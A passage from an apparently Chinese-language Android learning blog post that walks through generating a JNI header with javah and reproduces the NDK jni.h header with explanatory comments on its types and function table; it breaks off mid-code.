class="language-none">com.example.aaa.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812201251156.png" alt="image-20210812201251156"></p><h3 id="javah"><a href="#javah" class="headerlink" title="javah"></a>javah</h3><p>​    使用javah命令</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812200750394.png" alt="image-20210812200750394"></p><p>我们底层调用的头文件<code>.h</code>就是JNI样式的标头文件</p><pre class="line-numbers language-none"><code class="language-none">javah -jni com.example.aaa.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812210650157.png" alt="image-20210812210650157"></p><h3 id="Refresh"><a href="#Refresh" class="headerlink" title="Refresh"></a>Refresh</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812210738450.png" alt="image-20210812210738450"></p><p>在src目录生成<code>.h</code>的头文件</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812210811988.png" alt="image-20210812210811988"></p><p>进行分析</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812211054865.png" alt="image-20210812211054865"></p><pre class="line-numbers language-none"><code class="language-none">JNIEXPORT-&gt;标识符jobject -&gt;返回值JNICALL-&gt;标识符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万能表"><a href="#万能表" class="headerlink" title="万能表"></a>万能表</h3><pre class="line-numbers language-none"><code class="language-none">#ifndef JNI_H_#define JNI_H_#include &lt;sys/cdefs.h&gt;#include &lt;stdarg.h&gt;#ifdef HAVE_INTTYPES_H# include &lt;inttypes.h&gt;      /* C99 *///这个是JNI规范中定义的基本数据类型//typedef 关键字，可以使用它来为类型取一个新的名字。//举个例子：typedef unsigned char BYTE;在这个类型定义之后，标识符 BYTE 可作为类型 unsigned char 的缩写typedef uint8_t         jboolean;       /* unsigned 8 bits */typedef int8_t          jbyte;          /* signed 8 bits */typedef uint16_t        jchar;          /* unsigned 16 bits */typedef int16_t         jshort;         /* signed 16 bits */typedef int32_t         jint;           /* signed 32 bits */typedef int64_t         jlong;          /* signed 64 bits */typedef float           jfloat;         /* 32-bit IEEE 754 */typedef double          jdouble;        /* 64-bit IEEE 754 */#elsetypedef unsigned char   jboolean;       /* unsigned 8 bits */typedef signed char     jbyte;          /* signed 8 bits */typedef unsigned short  jchar;          /* unsigned 16 bits */typedef short           jshort;         /* signed 16 bits */typedef int             jint;           /* signed 32 bits */typedef long long       jlong;          /* signed 64 bits */typedef float           jfloat;         /* 32-bit IEEE 754 */typedef double          jdouble;        /* 64-bit IEEE 754 */#endif/* "cardinal indices and sizes" */typedef jint            jsize;//表示返回数组的大小#ifdef __cplusplus/* * Reference types, in C++//与C++有关的定义 */class _jobject {};class _jclass : public _jobject {};class _jstring : public _jobject {};class _jarray : public _jobject {};class _jobjectArray : public _jarray {};class _jbooleanArray : public _jarray {};class _jbyteArray : public _jarray {};class _jcharArray : public _jarray {};class _jshortArray : public _jarray {};class _jintArray : public _jarray {};class _jlongArray : public _jarray {};class _jfloatArray : public _jarray {};class _jdoubleArray : public _jarray {};class _jthrowable : public _jobject {};//为C++的一些类型进行重新定义typedef _jobject*       jobject;typedef _jclass*        jclass;typedef _jstring*       jstring;typedef _jarray*        jarray;typedef _jobjectArray*  jobjectArray;typedef _jbooleanArray* jbooleanArray;typedef _jbyteArray*    jbyteArray;typedef _jcharArray*    jcharArray;typedef _jshortArray*   jshortArray;typedef _jintArray*     jintArray;typedef _jlongArray*    jlongArray;typedef _jfloatArray*   jfloatArray;typedef _jdoubleArray*  jdoubleArray;typedef _jthrowable*    jthrowable;typedef _jobject*       jweak;#else /* not __cplusplus *//* * Reference types, in C.//与C有关的，继续为类型起新的名字；有arrary表示按JNI 标准定义的数组类型 */typedef void*           jobject;typedef jobject         jclass;typedef jobject         jstring;typedef jobject         jarray;typedef jarray          jobjectArray;typedef jarray          jbooleanArray;typedef jarray          jbyteArray;typedef jarray          jcharArray;typedef jarray          jshortArray;typedef jarray          jintArray;typedef jarray          jlongArray;typedef jarray          jfloatArray;typedef jarray          jdoubleArray;typedef jobject         jthrowable;typedef jobject         jweak;#endif /* not __cplusplus *///两个方法ID和字段IDstruct _jfieldID;                       /* opaque structure */typedef struct _jfieldID* jfieldID;     /* field IDs */struct _jmethodID;                      /* opaque structure */typedef struct _jmethodID* jmethodID;   /* method IDs *///定义一个结构体JNIInvokeInterface，是一个调用接口的结构体struct JNIInvokeInterface; //定义一个联合体jvalue，里面有各种类型typedef union jvalue {    jboolean    z;    jbyte       b;    jchar       c;    jshort      s;    jint        i;    jlong       j;    jfloat      f;    jdouble     d;    jobject     l;} jvalue;//定义一个枚举jobjectRefType，里面有各种枚举元素typedef enum jobjectRefType {    JNIInvalidRefType = 0,    JNILocalRefType = 1,    JNIGlobalRefType = 2,    JNIWeakGlobalRefType = 3} jobjectRefType;//定义一个动态注册JNINativeMethod结构体，这个与动态注册有关，里面有三个元素typedef struct {    const char* name; //第一个参数 name 是java 方法名；    const char* signature; //第二个参数 signature 用于描述方法的参数与返回值，也就是java方法签名信息，    void*       fnPtr; //第三个参数 fnPtr 是函数指针，指向 jni 函数；} JNINativeMethod;//其中，第二个参数 signature 使用字符串记录方法的参数与返回值，具体格式形如“()V”、“(II)V”，其中分为两部分，括号内表示的是参数，括号右侧表示的是返回值；struct _JNIEnv;struct _JavaVM;//定义一个JNINativeInterface结构体，表示原生调用接口的结构体typedef const struct JNINativeInterface* C_JNIEnv;#if defined(__cplusplus)typedef _JNIEnv JNIEnv;typedef _JavaVM JavaVM;#else//这里有两个接口，一个是本地接口，一个是调用接口typedef const struct JNINativeInterface* JNIEnv;//JNI本地接口typedef const struct JNIInvokeInterface* JavaVM;//JNI调用接口#endif//本地接口结构体的定义struct JNINativeInterface {    void*       reserved0;    void*       reserved1;    void*       reserved2;    void*       reserved3;    jint        (*GetVersion)(JNIEnv *);//jint返回的是版本信息//jclass，返回的是类    jclass      (*DefineClass)(JNIEnv*, const char*, jobject, const jbyte*,jsize);    jclass      (*FindClass)(JNIEnv*, const char*);    jmethodID   (*FromReflectedMethod)(JNIEnv*, jobject);    jfieldID    (*FromReflectedField)(JNIEnv*, jobject);       jobject     (*ToReflectedMethod)(JNIEnv*, jclass, jmethodID, jboolean);    jclass      (*GetSuperclass)(JNIEnv*, jclass);    jboolean    (*IsAssignableFrom)(JNIEnv*, jclass, jclass);    jobject     (*ToReflectedField)(JNIEnv*, jclass, jfieldID, jboolean);//与异常有关的方法    jint        (*Throw)(JNIEnv*, jthrowable);    jint        (*ThrowNew)(JNIEnv *, jclass, const char *);    jthrowable  (*ExceptionOccurred)(JNIEnv*);    void        (*ExceptionDescribe)(JNIEnv*);    void        (*ExceptionClear)(JNIEnv*);    void        (*FatalError)(JNIEnv*, const char*);    jint        (*PushLocalFrame)(JNIEnv*, jint);    jobject     (*PopLocalFrame)(JNIEnv*, jobject);    jobject     (*NewGlobalRef)(JNIEnv*, jobject);    void        (*DeleteGlobalRef)(JNIEnv*, jobject);    void        (*DeleteLocalRef)(JNIEnv*, jobject);    jboolean    (*IsSameObject)(JNIEnv*, jobject, jobject);    jobject     (*NewLocalRef)(JNIEnv*, jobject);    jint        (*EnsureLocalCapacity)(JNIEnv*, jint);//新建object    jobject     (*AllocObject)(JNIEnv*, jclass);    jobject     (*NewObject)(JNIEnv*, jclass, jmethodID, ...);    jobject     (*NewObjectV)(JNIEnv*, jclass, jmethodID, va_list);    jobject     (*NewObjectA)(JNIEnv*, jclass, jmethodID, jvalue*);    jclass      (*GetObjectClass)(JNIEnv*, jobject);    jboolean    (*IsInstanceOf)(JNIEnv*, jobject, jclass);    jmethodID   (*GetMethodID)(JNIEnv*, jclass, const char*, const char*);//调用方法    jobject     (*CallObjectMethod)(JNIEnv*, jobject, jmethodID, ...);    jobject     (*CallObjectMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jobject     (*CallObjectMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jboolean    (*CallBooleanMethod)(JNIEnv*, jobject, jmethodID, ...);    jboolean    (*CallBooleanMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jboolean    (*CallBooleanMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jbyte       (*CallByteMethod)(JNIEnv*, jobject, jmethodID, ...);    jbyte       (*CallByteMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jbyte       (*CallByteMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jchar       (*CallCharMethod)(JNIEnv*, jobject, jmethodID, ...);    jchar       (*CallCharMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jchar       (*CallCharMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jshort      (*CallShortMethod)(JNIEnv*, jobject, jmethodID, ...);    jshort      (*CallShortMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jshort      (*CallShortMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jint        (*CallIntMethod)(JNIEnv*, jobject, jmethodID, ...);    jint        (*CallIntMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jint        (*CallIntMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jlong       (*CallLongMethod)(JNIEnv*, jobject, jmethodID, ...);    jlong       (*CallLongMethodV)(JNIEnv*, jobject, jmethodID, va_list);    jlong       (*CallLongMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jfloat      (*CallFloatMethod)(JNIEnv*, jobject, jmethodID, ...) __NDK_FPABI__;    jfloat      (*CallFloatMethodV)(JNIEnv*, jobject, jmethodID, va_list) __NDK_FPABI__;    jfloat      (*CallFloatMethodA)(JNIEnv*, jobject, jmethodID, jvalue*) __NDK_FPABI__;    jdouble     (*CallDoubleMethod)(JNIEnv*, jobject, jmethodID, ...) __NDK_FPABI__;    jdouble     (*CallDoubleMethodV)(JNIEnv*, jobject, jmethodID, va_list) __NDK_FPABI__;    jdouble     (*CallDoubleMethodA)(JNIEnv*, jobject, jmethodID, jvalue*) __NDK_FPABI__;    void        (*CallVoidMethod)(JNIEnv*, jobject, jmethodID, ...);    void        (*CallVoidMethodV)(JNIEnv*, jobject, jmethodID, va_list);    void        (*CallVoidMethodA)(JNIEnv*, jobject, jmethodID, jvalue*);    jobject     (*CallNonvirtualObjectMethod)(JNIEnv*, jobject, jclass, jmethodID, ...);    jobject     (*CallNonvirtualObjectMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jobject     (*CallNonvirtualObjectMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jboolean    (*CallNonvirtualBooleanMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    jboolean    (*CallNonvirtualBooleanMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jboolean    (*CallNonvirtualBooleanMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jbyte       (*CallNonvirtualByteMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    jbyte       (*CallNonvirtualByteMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jbyte       (*CallNonvirtualByteMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jchar       (*CallNonvirtualCharMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    jchar       (*CallNonvirtualCharMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jchar       (*CallNonvirtualCharMethodA)(JNIEnv*, jobject, jclass, jmethodID, jvalue*);    jshort      (*CallNonvirtualShortMethod)(JNIEnv*, jobject, jclass, jmethodID, ...);    jshort      (*CallNonvirtualShortMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jshort      (*CallNonvirtualShortMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jint        (*CallNonvirtualIntMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    jint        (*CallNonvirtualIntMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jint        (*CallNonvirtualIntMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jlong       (*CallNonvirtualLongMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    jlong       (*CallNonvirtualLongMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    jlong       (*CallNonvirtualLongMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);    jfloat      (*CallNonvirtualFloatMethod)(JNIEnv*, jobject, jclass,jmethodID, ...) __NDK_FPABI__;    jfloat      (*CallNonvirtualFloatMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list) __NDK_FPABI__;    jfloat      (*CallNonvirtualFloatMethodA)(JNIEnv*, jobject, jclass, jmethodID, jvalue*) __NDK_FPABI__;    jdouble     (*CallNonvirtualDoubleMethod)(JNIEnv*, jobject, jclass,jmethodID, ...) __NDK_FPABI__;    jdouble     (*CallNonvirtualDoubleMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list) __NDK_FPABI__;    jdouble     (*CallNonvirtualDoubleMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*) __NDK_FPABI__;    void        (*CallNonvirtualVoidMethod)(JNIEnv*, jobject, jclass,jmethodID, ...);    void        (*CallNonvirtualVoidMethodV)(JNIEnv*, jobject, jclass,jmethodID, va_list);    void        (*CallNonvirtualVoidMethodA)(JNIEnv*, jobject, jclass,jmethodID, jvalue*);//获取各种字段    jfieldID    (*GetFieldID)(JNIEnv*, jclass, const char*, const char*);    jobject     (*GetObjectField)(JNIEnv*, jobject, jfieldID);    jboolean    (*GetBooleanField)(JNIEnv*, jobject, jfieldID);    jbyte       (*GetByteField)(JNIEnv*, jobject, jfieldID);    jchar       (*GetCharField)(JNIEnv*, jobject, jfieldID);    jshort      (*GetShortField)(JNIEnv*, jobject, jfieldID);    jint        (*GetIntField)(JNIEnv*, jobject, jfieldID);    jlong       (*GetLongField)(JNIEnv*, jobject, jfieldID);    jfloat      (*GetFloatField)(JNIEnv*, jobject, jfieldID) __NDK_FPABI__;    jdouble     (*GetDoubleField)(JNIEnv*, jobject, jfieldID) __NDK_FPABI__;//设置各种字段，返回为空    void        (*SetObjectField)(JNIEnv*, jobject, jfieldID, jobject);    void        (*SetBooleanField)(JNIEnv*, jobject, jfieldID, jboolean);    void        (*SetByteField)(JNIEnv*, jobject, jfieldID, jbyte);    void        (*SetCharField)(JNIEnv*, jobject, jfieldID, jchar);    void        (*SetShortField)(JNIEnv*, jobject, jfieldID, jshort);    void        (*SetIntField)(JNIEnv*, jobject, jfieldID, jint);    void        (*SetLongField)(JNIEnv*, jobject, jfieldID, jlong);    void        (*SetFloatField)(JNIEnv*, jobject, jfieldID, jfloat) __NDK_FPABI__;    void        (*SetDoubleField)(JNIEnv*, jobject, jfieldID, jdouble) __NDK_FPABI__;    jmethodID   (*GetStaticMethodID)(JNIEnv*, jclass, const char*, const char*);    jobject     (*CallStaticObjectMethod)(JNIEnv*, jclass, jmethodID, ...);    jobject     (*CallStaticObjectMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jobject     (*CallStaticObjectMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jboolean    (*CallStaticBooleanMethod)(JNIEnv*, jclass, jmethodID, ...);    jboolean    (*CallStaticBooleanMethodV)(JNIEnv*, jclass, jmethodID,va_list);    jboolean    (*CallStaticBooleanMethodA)(JNIEnv*, jclass, jmethodID,jvalue*);    jbyte       (*CallStaticByteMethod)(JNIEnv*, jclass, jmethodID, ...);    jbyte       (*CallStaticByteMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jbyte       (*CallStaticByteMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jchar       (*CallStaticCharMethod)(JNIEnv*, jclass, jmethodID, ...);    jchar       (*CallStaticCharMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jchar       (*CallStaticCharMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jshort      (*CallStaticShortMethod)(JNIEnv*, jclass, jmethodID, ...);    jshort      (*CallStaticShortMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jshort      (*CallStaticShortMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jint        (*CallStaticIntMethod)(JNIEnv*, jclass, jmethodID, ...);    jint        (*CallStaticIntMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jint        (*CallStaticIntMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jlong       (*CallStaticLongMethod)(JNIEnv*, jclass, jmethodID, ...);    jlong       (*CallStaticLongMethodV)(JNIEnv*, jclass, jmethodID, va_list);    jlong       (*CallStaticLongMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jfloat      (*CallStaticFloatMethod)(JNIEnv*, jclass, jmethodID, ...) __NDK_FPABI__;    jfloat      (*CallStaticFloatMethodV)(JNIEnv*, jclass, jmethodID, va_list) __NDK_FPABI__;    jfloat      (*CallStaticFloatMethodA)(JNIEnv*, jclass, jmethodID, jvalue*) __NDK_FPABI__;    jdouble     (*CallStaticDoubleMethod)(JNIEnv*, jclass, jmethodID, ...) __NDK_FPABI__;    jdouble     (*CallStaticDoubleMethodV)(JNIEnv*, jclass, jmethodID, va_list) __NDK_FPABI__;    jdouble     (*CallStaticDoubleMethodA)(JNIEnv*, jclass, jmethodID, jvalue*) __NDK_FPABI__;    void        (*CallStaticVoidMethod)(JNIEnv*, jclass, jmethodID, ...);    void        (*CallStaticVoidMethodV)(JNIEnv*, jclass, jmethodID, va_list);    void        (*CallStaticVoidMethodA)(JNIEnv*, jclass, jmethodID, jvalue*);    jfieldID    (*GetStaticFieldID)(JNIEnv*, jclass, const char*,const char*);    jobject     (*GetStaticObjectField)(JNIEnv*, jclass, jfieldID);    jboolean    (*GetStaticBooleanField)(JNIEnv*, jclass, jfieldID);    jbyte       (*GetStaticByteField)(JNIEnv*, jclass, jfieldID);    jchar       (*GetStaticCharField)(JNIEnv*, jclass, jfieldID);    jshort      (*GetStaticShortField)(JNIEnv*, jclass, jfieldID);    jint        (*GetStaticIntField)(JNIEnv*, jclass, jfieldID);    jlong       (*GetStaticLongField)(JNIEnv*, jclass, jfieldID);    jfloat      (*GetStaticFloatField)(JNIEnv*, jclass, jfieldID) __NDK_FPABI__;    jdouble     (*GetStaticDoubleField)(JNIEnv*, jclass, jfieldID) __NDK_FPABI__;    void        (*SetStaticObjectField)(JNIEnv*, jclass, jfieldID, jobject);    void        (*SetStaticBooleanField)(JNIEnv*, jclass, jfieldID, jboolean);    void        (*SetStaticByteField)(JNIEnv*, jclass, jfieldID, jbyte);    void        (*SetStaticCharField)(JNIEnv*, jclass, jfieldID, jchar);    void        (*SetStaticShortField)(JNIEnv*, jclass, jfieldID, jshort);    void        (*SetStaticIntField)(JNIEnv*, jclass, jfieldID, jint);    void        (*SetStaticLongField)(JNIEnv*, jclass, jfieldID, jlong);    void        (*SetStaticFloatField)(JNIEnv*, jclass, jfieldID, jfloat) __NDK_FPABI__;    void        (*SetStaticDoubleField)(JNIEnv*, jclass, jfieldID, jdouble) __NDK_FPABI__;    jstring     (*NewString)(JNIEnv*, const jchar*, jsize);    jsize       (*GetStringLength)(JNIEnv*, jstring);    const jchar*(*GetStringChars)(JNIEnv*, jstring, jboolean*);    void        (*ReleaseStringChars)(JNIEnv*, jstring, const jchar*);    jstring     (*NewStringUTF)(JNIEnv*, const char*);    jsize       (*GetStringUTFLength)(JNIEnv*, jstring);      const char* (*GetStringUTFChars)(JNIEnv*, jstring, jboolean*);    void        (*ReleaseStringUTFChars)(JNIEnv*, jstring, const char*);    jsize       (*GetArrayLength)(JNIEnv*, jarray);    jobjectArray(*NewObjectArray)(JNIEnv*, jsize, jclass, jobject);    jobject     (*GetObjectArrayElement)(JNIEnv*, jobjectArray, jsize);    void        (*SetObjectArrayElement)(JNIEnv*, jobjectArray, jsize, jobject);    jbooleanArray (*NewBooleanArray)(JNIEnv*, jsize);    jbyteArray    (*NewByteArray)(JNIEnv*, jsize);    jcharArray    (*NewCharArray)(JNIEnv*, jsize);    jshortArray   (*NewShortArray)(JNIEnv*, jsize);    jintArray     (*NewIntArray)(JNIEnv*, jsize);    jlongArray    (*NewLongArray)(JNIEnv*, jsize);    jfloatArray   (*NewFloatArray)(JNIEnv*, jsize);    jdoubleArray  (*NewDoubleArray)(JNIEnv*, jsize);    jboolean*   (*GetBooleanArrayElements)(JNIEnv*, jbooleanArray, jboolean*);    jbyte*      (*GetByteArrayElements)(JNIEnv*, jbyteArray, jboolean*);    jchar*      (*GetCharArrayElements)(JNIEnv*, jcharArray, jboolean*);    jshort*     (*GetShortArrayElements)(JNIEnv*, jshortArray, jboolean*);    jint*       (*GetIntArrayElements)(JNIEnv*, jintArray, jboolean*);    jlong*      (*GetLongArrayElements)(JNIEnv*, jlongArray, jboolean*);    jfloat*     (*GetFloatArrayElements)(JNIEnv*, jfloatArray, jboolean*);    jdouble*    (*GetDoubleArrayElements)(JNIEnv*, jdoubleArray, jboolean*);    void        (*ReleaseBooleanArrayElements)(JNIEnv*, jbooleanArray,jboolean*, jint);    void        (*ReleaseByteArrayElements)(JNIEnv*, jbyteArray,jbyte*, jint);    void        (*ReleaseCharArrayElements)(JNIEnv*, jcharArray,jchar*, jint);    void        (*ReleaseShortArrayElements)(JNIEnv*, jshortArray,jshort*, jint);    void        (*ReleaseIntArrayElements)(JNIEnv*, jintArray,jint*, jint);    void        (*ReleaseLongArrayElements)(JNIEnv*, jlongArray,jlong*, jint);    void        (*ReleaseFloatArrayElements)(JNIEnv*, jfloatArray,jfloat*, jint);    void        (*ReleaseDoubleArrayElements)(JNIEnv*, jdoubleArray,jdouble*, jint);    void        (*GetBooleanArrayRegion)(JNIEnv*, jbooleanArray,jsize,jsize, jboolean*);    void        (*GetByteArrayRegion)(JNIEnv*, jbyteArray,jsize, jsize,jbyte*);    void        (*GetCharArrayRegion)(JNIEnv*, jcharArray, jsize, jsize,jchar*);    void        (*GetShortArrayRegion)(JNIEnv*, jshortArray,jsize, jsize,jshort*);    void        (*GetIntArrayRegion)(JNIEnv*, jintArray,jsize, jsize, jint*);    void        (*GetLongArrayRegion)(JNIEnv*, jlongArray,jsize, jsize, jlong*);    void        (*GetFloatArrayRegion)(JNIEnv*, jfloatArray,jsize, jsize, jfloat*);    void        (*GetDoubleArrayRegion)(JNIEnv*, jdoubleArray,jsize, jsize, jdouble*);    void        (*SetBooleanArrayRegion)(JNIEnv*, jbooleanArray,jsize, jsize, const jboolean*);    void        (*SetByteArrayRegion)(JNIEnv*, jbyteArray,jsize, jsize, const jbyte*);    void        (*SetCharArrayRegion)(JNIEnv*, jcharArray,jsize, jsize, const jchar*);    void        (*SetShortArrayRegion)(JNIEnv*, jshortArray,jsize, jsize, const jshort*);    void        (*SetIntArrayRegion)(JNIEnv*, jintArray,jsize, jsize, const jint*);    void        (*SetLongArrayRegion)(JNIEnv*, jlongArray, jsize, jsize, const jlong*);    void        (*SetFloatArrayRegion)(JNIEnv*, jfloatArray, jsize, jsize, const jfloat*);    void        (*SetDoubleArrayRegion)(JNIEnv*, jdoubleArray,jsize, jsize, const jdouble*);    jint        (*RegisterNatives)(JNIEnv*, jclass, const JNINativeMethod*,jint);    jint        (*UnregisterNatives)(JNIEnv*, jclass);    jint        (*MonitorEnter)(JNIEnv*, jobject);    jint        (*MonitorExit)(JNIEnv*, jobject);    jint        (*GetJavaVM)(JNIEnv*, JavaVM**);    void        (*GetStringRegion)(JNIEnv*, jstring, jsize, jsize, jchar*);    void        (*GetStringUTFRegion)(JNIEnv*, jstring, jsize, jsize, char*);    void*       (*GetPrimitiveArrayCritical)(JNIEnv*, jarray, jboolean*);    void        (*ReleasePrimitiveArrayCritical)(JNIEnv*, jarray, void*, jint);    const jchar*(*GetStringCritical)(JNIEnv*, jstring, jboolean*);    void        (*ReleaseStringCritical)(JNIEnv*, jstring, const jchar*);    jweak       (*NewWeakGlobalRef)(JNIEnv*, jobject);    void        (*DeleteWeakGlobalRef)(JNIEnv*, jweak);    jboolean    (*ExceptionCheck)(JNIEnv*);    jobject     (*NewDirectByteBuffer)(JNIEnv*, void*, jlong);    void*       (*GetDirectBufferAddress)(JNIEnv*, jobject);    jlong       (*GetDirectBufferCapacity)(JNIEnv*, jobject);    jobjectRefType (*GetObjectRefType)(JNIEnv*, jobject);};/* * C++  *///C++的JNI 本地接口结构体的调用struct _JNIEnv {    const struct JNINativeInterface* functions;#if defined(__cplusplus)//各种函数    jint GetVersion()    { return functions-&gt;GetVersion(this); }    jclass DefineClass(const char *name, jobject loader, const jbyte* buf,        jsize bufLen)    { return functions-&gt;DefineClass(this, name, loader, buf, bufLen); }    jclass FindClass(const char* name)    { return functions-&gt;FindClass(this, name); }    jmethodID FromReflectedMethod(jobject method)    { return functions-&gt;FromReflectedMethod(this, method); }    jfieldID FromReflectedField(jobject field)    { return functions-&gt;FromReflectedField(this, field); }    jobject ToReflectedMethod(jclass cls, jmethodID methodID, jboolean isStatic)    { return functions-&gt;ToReflectedMethod(this, cls, methodID, isStatic); }    jclass GetSuperclass(jclass clazz)    { return functions-&gt;GetSuperclass(this, clazz); }    jboolean IsAssignableFrom(jclass clazz1, jclass clazz2)    { return functions-&gt;IsAssignableFrom(this, clazz1, clazz2); }    jobject ToReflectedField(jclass cls, jfieldID fieldID, jboolean isStatic)    { return functions-&gt;ToReflectedField(this, cls, fieldID, isStatic); }    jint Throw(jthrowable obj)    { return functions-&gt;Throw(this, obj); }    jint ThrowNew(jclass clazz, const char* message)    { return functions-&gt;ThrowNew(this, clazz, message); }    jthrowable ExceptionOccurred()    { return functions-&gt;ExceptionOccurred(this); }    void ExceptionDescribe()    { functions-&gt;ExceptionDescribe(this); }    void ExceptionClear()    { functions-&gt;ExceptionClear(this); }    void FatalError(const char* msg)    { functions-&gt;FatalError(this, msg); }    jint PushLocalFrame(jint capacity)    { return functions-&gt;PushLocalFrame(this, capacity); }    jobject PopLocalFrame(jobject result)    { return functions-&gt;PopLocalFrame(this, result); }    jobject NewGlobalRef(jobject obj)    { return functions-&gt;NewGlobalRef(this, obj); }    void DeleteGlobalRef(jobject globalRef)    { functions-&gt;DeleteGlobalRef(this, globalRef); }    void DeleteLocalRef(jobject localRef)    { functions-&gt;DeleteLocalRef(this, localRef); }    jboolean IsSameObject(jobject ref1, jobject ref2)    { return functions-&gt;IsSameObject(this, ref1, ref2); }    jobject NewLocalRef(jobject ref)    { return functions-&gt;NewLocalRef(this, ref); }    jint EnsureLocalCapacity(jint capacity)    { return functions-&gt;EnsureLocalCapacity(this, capacity); }    jobject AllocObject(jclass clazz)    { return functions-&gt;AllocObject(this, clazz); }    jobject NewObject(jclass clazz, jmethodID methodID, ...)    {        va_list args;        va_start(args, methodID);        jobject result = functions-&gt;NewObjectV(this, clazz, methodID, args);        va_end(args);        return result;    }    jobject NewObjectV(jclass clazz, jmethodID methodID, va_list args)    { return functions-&gt;NewObjectV(this, clazz, methodID, args); }    jobject NewObjectA(jclass clazz, jmethodID methodID, jvalue* args)    { return functions-&gt;NewObjectA(this, clazz, methodID, args); }    jclass GetObjectClass(jobject obj)    { return functions-&gt;GetObjectClass(this, obj); }    jboolean IsInstanceOf(jobject obj, jclass clazz)    { return functions-&gt;IsInstanceOf(this, obj, clazz); }    jmethodID GetMethodID(jclass clazz, const char* name, const char* sig)    { return functions-&gt;GetMethodID(this, clazz, name, sig); }#define CALL_TYPE_METHOD(_jtype, _jname)                                    \    __NDK_FPABI__                                                           \    _jtype Call##_jname##Method(jobject obj, jmethodID methodID, ...)       \    {                                                                       \        _jtype result;                                                      \        va_list args;                                                       \        va_start(args, methodID);                                           \        result = functions-&gt;Call##_jname##MethodV(this, obj, methodID,      \                    args);                                                  \        va_end(args);                                                       \        return result;                                                      \    }#define CALL_TYPE_METHODV(_jtype, _jname)                                   \    __NDK_FPABI__                                                           \    _jtype Call##_jname##MethodV(jobject obj, jmethodID methodID,           \        va_list args)                                                       \    { return functions-&gt;Call##_jname##MethodV(this, obj, methodID, args); }#define CALL_TYPE_METHODA(_jtype, _jname)                                   \    __NDK_FPABI__                                                           \    _jtype Call##_jname##MethodA(jobject obj, jmethodID methodID,           \        jvalue* args)                                                       \    { return functions-&gt;Call##_jname##MethodA(this, obj, methodID, args); }#define CALL_TYPE(_jtype, _jname)                                           \    CALL_TYPE_METHOD(_jtype, _jname)                                        \    CALL_TYPE_METHODV(_jtype, _jname)                                       \    CALL_TYPE_METHODA(_jtype, _jname)    CALL_TYPE(jobject, Object)    CALL_TYPE(jboolean, Boolean)    CALL_TYPE(jbyte, Byte)    CALL_TYPE(jchar, Char)    CALL_TYPE(jshort, Short)    CALL_TYPE(jint, Int)    CALL_TYPE(jlong, Long)    CALL_TYPE(jfloat, Float)    CALL_TYPE(jdouble, Double)    void CallVoidMethod(jobject obj, jmethodID methodID, ...)    {        va_list args;        va_start(args, methodID);        functions-&gt;CallVoidMethodV(this, obj, methodID, args);        va_end(args);    }    void CallVoidMethodV(jobject obj, jmethodID methodID, va_list args)    { functions-&gt;CallVoidMethodV(this, obj, methodID, args); }    void CallVoidMethodA(jobject obj, jmethodID methodID, jvalue* args)    { functions-&gt;CallVoidMethodA(this, obj, methodID, args); }#define CALL_NONVIRT_TYPE_METHOD(_jtype, _jname)                            \    __NDK_FPABI__                                                           \    _jtype CallNonvirtual##_jname##Method(jobject obj, jclass clazz,        \        jmethodID methodID, ...)                                            \    {                                                            